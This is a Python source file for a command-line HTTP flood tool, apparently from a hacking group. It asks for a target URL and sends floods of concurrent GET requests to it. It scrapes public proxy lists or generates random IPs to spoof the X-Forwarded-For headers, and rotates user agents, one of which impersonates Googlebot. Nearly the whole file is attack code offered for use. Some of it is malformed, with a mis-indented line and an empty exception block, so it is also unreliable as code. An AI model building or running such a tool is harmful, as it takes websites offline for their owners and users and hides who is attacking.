import aiohttp
import asyncio
import random
import itertools
import time
import re
import string
import sys
import shutil
from colorama import Fore, init

init(autoreset=True)

# Short, valid list of user agents (fixed - no accidental concatenation)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.96 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

proxy_sources = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
]

class CliAttacker:
    def __init__(self, target_url, num_requests):
        self.target_url = target_url
        self.num_requests = int(num_requests)
        self.max_concurrent = 250
        self.success_count = 0
        self.fail_count = 0
        self.start_time = None

    def log(self, message):
        print(f"{message}{Fore.RESET}")

    async def fetch_ip_addresses(self, url):
   
        connector = aiohttp.TCPConnector(ssl=False, limit=10)
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    text = await response.text()
                    # match ip:port
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b", text)
                    return ip_addresses
            except Exception as e:
      
                return []

    async def get_all_ips(self):
        
        sem = asyncio.Semaphore(10)
        async def fetch_with_sem(url):
            async with sem:
                return await self.fetch_ip_addresses(url)

        tasks = [fetch_with_sem(url) for url in proxy_sources]
        ip_lists = await asyncio.gather(*tasks, return_exceptions=False)
        all_ips = [ip for sublist in ip_lists for ip in sublist]

        # If not enough proxies, generate synthetic IPs (for X-Forwarded-For headers)
        if len(all_ips) < 1000:
            all_ips.extend([
                f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                for _ in range(1000)
            ])
        return all_ips

    async def send_request(self, session, ip_address):
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address,
            "X-Real-IP": ip_address,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Referer": self.target_url,
            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        }
        try:
            
            per_request_timeout = aiohttp.ClientTimeout(total=5)
            async with session.get(self.target_url, headers=headers, timeout=per_request_timeout) as response:
                # treat 2xx as success
                if 200 <= response.status < 300:
                    self.success_count += 1
                else:
                    self.fail_count += 1
         total_done = self.success_count + self.fail_count
                if total_done % 50 == 0 and total_done != 0:
                    elapsed = time.time() - self.start_time
                    rate = total_done / elapsed if elapsed > 0 else 0
                    self.log(Fore.RED + f"Requests: {self.success_count} | Failures: {self.fail_count} | Rate: {rate:.1f}/s | IP: {ip_address}")
        except Exception as e:

    async def attack_worker(self, session, ip_cycle, worker_id):
        
        while self.success_count + self.fail_count < self.num_requests:
            ip_addr = next(ip_cycle)
            await self.send_request(session, ip_addr)

    async def attack(self):
        self.start_time = time.time()
        self.log(Fore.CYAN + "Fetching proxy list...")

        ip_list = await self.get_all_ips()
        if not ip_list:
            ip_list = [f"10.0.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(2000)]

        self.log(Fore.CYAN + f"Loaded {len(ip_list)} IPs | Starting attack...")
        ip_cycle = itertools.cycle(ip_list)

       
        connector = aiohttp.TCPConnector(limit=100, ssl=False)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            
            worker_count = min(self.max_concurrent, self.num_requests, 200)
            workers = [asyncio.create_task(self.attack_worker(session, ip_cycle, i)) for i in range(worker_count)]
           
            await asyncio.gather(*workers, return_exceptions=True)

        elapsed = time.time() - self.start_time
        self.log(Fore.BLUE + f"Attack completed: {self.success_count} success, {self.fail_count} failed in {elapsed:.2f}s")

    def run(self):
        asyncio.run(self.attack())

def print_banner():
    columns = shutil.get_terminal_size().columns
    banner = r"""
 █▄░█ █░█ █░░ █░░ █▀ █▀▀ █▀▀
 █░▀█ █▄█ █▄▄ █▄▄ ▄█ ██▄ █▄▄

 █▀█ █░█ █ █░░ █ █▀█ █▀█ █ █▄░█ █▀▀ █▀
 █▀▀ █▀█ █ █▄▄ █ █▀▀ █▀▀ █ █░▀█ ██▄ ▄█

      Made By: Ethical Hex Nicks
"""
    for line in banner.splitlines():
        print(f"{Fore.RED}{line.center(columns)}{Fore.RESET}")

if __name__ == "__main__":
    print_banner()
    target_url = input(Fore.RED + "Enter Target URL: ").strip()
    try:
        num_requests = int(input(Fore.RED + "Enter Number of Requests: ").strip())
    except Exception:
        print(Fore.YELLOW + "Invalid number of requests. Exiting.")
        sys.exit(1)

    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url

    attacker = CliAttacker(target_url, num_requests)
    attacker.run()